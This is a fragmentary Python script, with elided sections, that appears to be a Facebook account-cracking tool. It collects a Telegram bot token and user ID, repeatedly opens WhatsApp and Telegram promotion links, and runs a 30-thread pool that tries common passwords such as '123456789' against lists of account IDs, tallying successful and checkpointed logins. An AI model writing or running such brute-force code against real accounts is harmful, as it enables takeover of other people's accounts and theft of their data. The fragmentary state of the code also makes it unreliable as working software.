...
os.system('clear')
print('>'+'='*54)
Logo=pyfiglet.figlet_format('            HNON ')
print(X+Logo)
print(f'{F} ' *11,'Devi : King',' '*3,'←')
print(f'{X}>'+'='*54)
print(f'{F} ' *11,'WpGroup:https://chat.whatsapp.com/E8AyCNt3Ux75W60Q7TR9e1?mode=r_c ',' '*3,'←')
print(f'{X}>'+'='*54)
print(f'{F} ' *11,'Facebook',' '*3,'          ')
print(f'{X}>'+'='*54)
webbrowser.open('https://chat.whatsapp.com/E8AyCNt3Ux75W60Q7TR9e1?mode=r_c')
import os
try:
...
print(f'{F}ضـع تـوڪن بـوتـك :')
print(f'{X}>'+'='*54)
webbrowser.open("https://t.me/mnnom4")
token=input(f'{F1} TOKAN :{Z1}')
print(f'{F}>'+'='*54)
print(f'{X}ضـع ايـدي حـسـابـك :')
print(f'{F}>'+'='*54)
ID=input(f'{F1}ID :{Z1}')
webbrowser.open("https://chat.whatsapp.com/E8AyCNt3Ux75W60Q7TR9e1?mode=r_c")
os.system('clear')
...
''' اختار دولتك '""")
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["1", "01"]:
			os.system('xdg-open https://github.com/deathherev')
		if DEVIL in ["1", "01"]:
			os.system('xdg-open https://chat.whatsapp.com/E8AyCNt3Ux75W60Q7TR9e1?mode=r_c')
		if DEVIL in ["", ""]:
			os.system('xdg-open https://whatsapp.com/channel/0029VanNdrv17Emw31WUQO46')
		if DEVIL in ["1",  "01"]:
			self.old2()
			exit()
		else:
	...
	def fbtua(self):
		...
		try:
			...
			os.system('clear')
			print(logo) 
			print("\033[1;97m ID \033[2;32mDevi\033[1;97m➪ \033[2;32m%s"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n \033[2;32mTYPE : \033[1;97m12345@@@,zxcvzxcv,123456789,1234567,123456")
				print('')
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write("\r\r%s\033[1;97m {\033[2;32m \033[1;97m{\033[2;32 @oio_r6 \033[1;97m }\033[1;31m{ %s/%s \033[1;31m}\033[1;97m{ working }\033[2;32m{ %s }\033[1;97m{ سيڪور }\033[1;31m{ %s }"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
